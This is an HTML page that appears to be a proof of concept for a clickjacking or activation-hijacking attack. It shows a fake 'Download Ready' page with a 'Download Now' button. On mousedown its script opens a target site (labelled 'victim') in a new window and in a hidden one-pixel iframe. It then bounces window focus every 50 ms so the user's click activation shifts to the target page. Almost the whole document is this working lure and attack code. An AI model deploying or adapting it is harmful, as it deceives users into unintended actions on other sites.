<!DOCTYPE html>
<html>

<body style="background:#f5f5f5;font-family:sans-serif;text-align:center;padding-top:200px;">

    <h2>Download Ready</h2>
    <p>Your file is ready. Click below to continue.</p>

    <button id="btn"
        style="padding:15px 30px;font-size:18px;border:none;border-radius:10px;background:#4CAF50;color:white;cursor:pointer;">
        Download Now
    </button>

    <iframe id="ghostFrame" style="width:1px;height:1px;opacity:0;"></iframe>

    <script>
        const targetURL = "https://read-poc.vercel.app/";
        let victim = null;

        const btn = document.getElementById("btn");
        const ghost = document.getElementById("ghostFrame");

        btn.addEventListener("mousedown", () => {
            console.log("[*] mousedown → open victim");
            victim = window.open(targetURL, "_blank");

            ghost.src = targetURL;

            startFocusBounce();
        });

        btn.addEventListener("mouseup", () => {
            console.log("[*] mouseup → shift activation");

            if (victim) {
                try {
                    victim.focus();
                } catch (e) {}
            }
        });

        function startFocusBounce() {
            const interval = setInterval(() => {
                if (!victim || victim.closed) {
                    clearInterval(interval);
                    return;
                }

                try {
                    victim.focus();
                    window.focus();
                } catch (e) {}
            }, 50);

            setTimeout(() => clearInterval(interval), 1000);
        }
    </script>

</body>
</html>
